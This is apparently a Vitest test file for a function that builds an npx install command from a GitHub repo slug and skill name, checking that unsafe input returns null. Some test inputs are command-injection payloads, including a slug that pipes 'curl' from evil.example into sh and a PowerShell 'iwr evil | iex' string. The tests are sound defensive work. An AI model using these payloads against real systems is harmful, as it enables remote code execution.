import { describe, expect, it } from 'vitest';

import { buildInstallCommand } from './build-install-command';
import { parseRepoPath } from './parse-repo-path';

describe('buildInstallCommand', () => {
  it('should build the npx skillstack-cli add command with the GitHub URL and skill name', () => {
    const command = buildInstallCommand('octocat/hello-world', 'code-review');

    expect(command).toBe(
      'npx skillstack-cli add https://github.com/octocat/hello-world --skill code-review'
    );
  });

  it('should use a repository URL that parseRepoPath accepts', () => {
    const command = buildInstallCommand('octocat/hello-world', 'code-review');
    const repoUrl = command?.match(/https:\/\/\S+/)?.[0] ?? '';

    expect(parseRepoPath(repoUrl)).toMatchObject({
      owner: 'octocat',
      repo: 'hello-world'
    });
  });

  it('should keep the skill name exactly as given when it only has safe characters', () => {
    const command = buildInstallCommand('octocat/hello-world', 'My_skill-2.v1');

    expect(command).toBe(
      'npx skillstack-cli add https://github.com/octocat/hello-world --skill My_skill-2.v1'
    );
  });

  it('should return null for a repository slug with shell metacharacters', () => {
    const command = buildInstallCommand(
      'acme/tools;curl -s https://evil.example/x|sh;#',
      'lint'
    );

    expect(command).toBeNull();
  });

  it.each([
    "x'; iwr evil | iex; '",
    'my skill; ls',
    "it's",
    '-rf',
    'a&calc',
    ''
  ])('should return null for the skill name %j outside the allowlist', name => {
    const command = buildInstallCommand('octocat/hello-world', name);

    expect(command).toBeNull();
  });

  it('should never quote or rewrite its input', () => {
    const command = buildInstallCommand('octocat/hello-world', "it's");

    expect(command).toBeNull();
    expect(buildInstallCommand('octocat/hello-world', 'a.b_c-d')).not.toMatch(
      /['"\\]/
    );
  });
});
